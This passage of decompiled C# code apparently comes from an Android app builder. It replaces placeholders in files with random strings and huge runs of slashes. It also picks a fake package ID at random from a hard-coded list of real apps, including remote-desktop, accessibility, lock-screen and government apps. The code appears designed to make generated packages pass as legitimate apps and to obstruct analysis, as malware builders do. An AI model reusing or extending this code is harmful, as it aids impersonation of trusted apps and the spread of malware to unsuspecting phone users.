			for (int i = 0; i <= num; i++)
			{
				array[i] = '/';
			}
			long num2 = length;
			while (num2 > 0)
			{
				int num3 = (int)Math.Min(array.Length, num2);
				sw.Write(array, 0, num3);
				num2 -= num3;
			}
		}
	}

	public static void ReplaceHugePlaceholders(string filePath, long randomLength, long slashLength)
	{
		string text = filePath + ".tmp";
		checked
		{
			using (StreamReader streamReader = new StreamReader(filePath))
			{
				using FileStream stream = new FileStream(text, FileMode.Create, FileAccess.Write);
				using StreamWriter streamWriter = new StreamWriter(stream);
				string target = default(string);
				while (InlineAssign(ref target, streamReader.ReadLine()) != null)
				{
					string text2 = target;
					int num = text2.IndexOf("cnamspace");
					if (num >= 0)
					{
						streamWriter.Write(text2.Substring(0, num));
						WriteRandomStringToStream(streamWriter, randomLength);
						text2 = text2.Substring(num + 9);
					}
					num = text2.IndexOf("cnamevalue");
					if (num >= 0)
					{
						streamWriter.Write(text2.Substring(0, num));
						WriteHugeSlashesToStream(streamWriter, slashLength);
						WriteRandomStringToStream(streamWriter, randomLength);
						text2 = text2.Substring(num + 10);
					}
					streamWriter.WriteLine(text2);
				}
			}
			File.Delete(filePath);
			File.Move(text, filePath);
		}
	}

	private static T InlineAssign<T>(ref T target, T value)
	{
		target = value;
		return value;
	}

	public static string GetRandomPaths(long length)
	{
		return new string('/', checked((int)length));
	}

	public static string GetRandomPackageID()
	{
		if (Rndomizid == null)
		{
			Rndomizid = new Random();
		}
		List<string> source = new List<string>
		{
			"com.PrankDial", "com.psoffritti.blur.face", "prank.caller.funny.dial.fake.id.app", "com.defianttech.convertme", "es.mrcl.app.juasapp", "by4a.setedit22", "com.fakecall.fakefriends.funchat.jokephone", "com.fakecall.prank.phonecalls.callvoices", "com.fakecall.Fake.Prank.Call", "prankcall.fakevideocall.idolcall.hahacall",
			"com.fakecall.videocallandchat.celebrity", "com.cashitapp.app.jokesphone", "com.mlhg.screenfilter", "com.bitculture.nopaccessibility", "com.entersoftware.iperiusremotedesktop", "com.oasisfeng.greenify", "uk.co.transreport.pa", "uk.gov.HomeOffice.ho3", "com.ahnlab.v3mobilesecurity.soda", "com.orange.orangeetmoi",
			"com.truedevelopersstudio.automatictap.autoclicker", "com.bitculture.nopaccessibility", "com.dlive.kidssafety.service", "com.wakoopa.trendbeat", "com.hmdglobal.app.emmcompanion.gpemm", "com.lsdroid.lsp", "com.airwatch.rm.agent.cloud", "com.nurago.gfkmepbnl01", "com.icontrol.easy.widgets.themes", "com.baliuapps.superapp",
			"com.ltsoft.ltdocsviewer", "net.sdvlgroup.apps.prankcallmonster", "com.greatlivesound.livesoundguide", "com.fakecall.videocallandchat.celebrity", "com.hosay.hazesg", "com.santa.prankcall.funny.christmas", "com.pigdogbay.anagramsolverpro", "uconvert.biom8trix.app", "com.fakecall.prank.phonecalls.callvoices", "com.fakeCall.Fake.Prank.Call",
			"com.fakecall.fungame.prankfriend.fakecallme", "com.fakecall.videocallandchat.celebrity", "com.fakecall.fakefriends.funchat.jokephone", "com.probadosoft.moonphasecalendar", "com.agusnam.textutil", "com.harrys.dyno", "com.unit.fake.call", "com.fungame.fakecall.prankfriend", "crazy.pradeep.multismssender", "com.g705",
			"com.mhvmedia.anycall", "com.ttmob.hks", "com.csdroid.pkg", "com.telos.app.im", "com.clickassistant.autoclicker", "com.bgstudio.autoclicker", "com.easytouch.assistivetouch", "com.soomapps.backbutton", "com.easyapps.autoclicker", "com.backbutton.remapper",
			"com.fake.call.simulator", "com.backkey.buttonsoft", "com.tapping.auto.clicker", "com.gonext.fakemycall", "com.applock.lockapp", "com.hbt.backbutton", "com.weird.prank.fakecall", "com.clickmate.autotouch", "com.perfect.tools.autoclick", "com.secret.calls.fakeid",
			"com.assistive.touch.pro", "com.babydola.lockscreens", "net.east_hino.accessibility_shortcut", "com.appautomatic.ankulua.lite", "com.bitculture.nopaccessibility", "com.redmanit.lockscreen", "net.met.control.center", "com.jordigordillo.dtswidget", "apps.ijp.ainput", "com.remotepc.host",
			"com.idrive.helpdesk.host", "com.screentime", "com.motorola.spaces", "nu.nav.float", "com.kahf.dns", "com.voicemouse", "com.mithriltower.accessibilityservicesapp", "com.homebutton.menubutton.easytouch", "flud.fludnav.fludnavbar", "mavie.shadowsong.bb",
			"nu.lower.brightness.pro", "com.apowersoft.mirror", "com.deque.mobile.devtools.axedevtoolsanalyzer", "com.homebutton.menubutton.easytouch", "net.east_hino.accessibility_shortcut", "com.sisomobile.android.brightness", "com.autolikeswipe", "com.force.stop.apps", "com.harasees.lockscreen", "com.gb.lock",
			"com.weixikeji.secretshoot.googleV2", "com.idrive.helpdesk.host", "com.remotepc.host", "com.asus.glidex", "com.gameclicker.autoclicker.pro", "com.pransuinc.backbutton", "com.autoclick.automatic.speed.clicker.tools", "com.guhyata.privacymanager.lite", "com.visioapps.louie", "com.asus.glidex",
			"com.shexa.permissionmanager", "com.glitch.accessibilitytester", "com.redmanit.lockscreen", "com.tyganeutronics.telcomaster", "net.eztool.backbutton", "nu.back.button", "com.autoclicker.quicktouch.tapping", "com.sisomobile.android.brightness", "com.motorola.tag", "com.automatictap.autoclicker.clickerspeed",
			"com.motorola.detachedhandler", "an.AfrikaansTranslate", "com.poshantracker", "free_translator.mlen", "com.handayani_lagu_fariez_meonk_kala_bennyak", "egov.app", "it.enel", "eyalin.mydevicedetailsheb", "com.disawar_satta_king", "shareit.lite",
			"com.ac.englishtoafrikaanstranslator"
		};
		List<string> list = source.Distinct().ToList();
		int num = Rndomizid.Next(0, list.Count);
		int num2 = 1;
		do
		{
			num = Rndomizid.Next(0, list.Count);
			num2 = checked(num2 + 1);
		}
		while (num2 <= 4);
		return list[num];
	}
}
